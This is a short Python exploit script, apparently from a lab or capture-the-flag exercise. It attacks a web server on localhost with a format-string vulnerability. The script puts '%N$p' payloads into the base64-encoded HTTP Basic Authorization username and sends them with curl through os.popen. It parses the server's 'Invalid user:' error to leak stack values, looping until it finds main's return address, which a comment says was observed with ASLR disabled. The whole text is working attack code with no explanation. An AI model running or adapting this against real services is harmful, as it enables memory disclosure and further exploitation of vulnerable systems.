import base64
import time
import os


def getLeak(s):
    auth = s + ":"
    curl = "curl -I 'http://localhost:8000/'  -H 'Authorization: Basic "+ base64.b64encode(auth.encode()).decode("utf-8") +"'"
    res = os.popen(curl).read()
    print(res)
    start = res.find("Invalid user: ") + 14
    end = res.index("\"",start)
    return res[start:end]


i = 1
while True:
    print("i = " + str(i))
    s = "%"+str(i)+"$p"
    leak = getLeak(s)
    if(leak != "(nil)" and leak == '0xf7b2cee5'): # '0xf7b2cee5' is the return address of main in local machine after disabling ASLR
        break
    i = i + 1
    time.sleep(0.5)

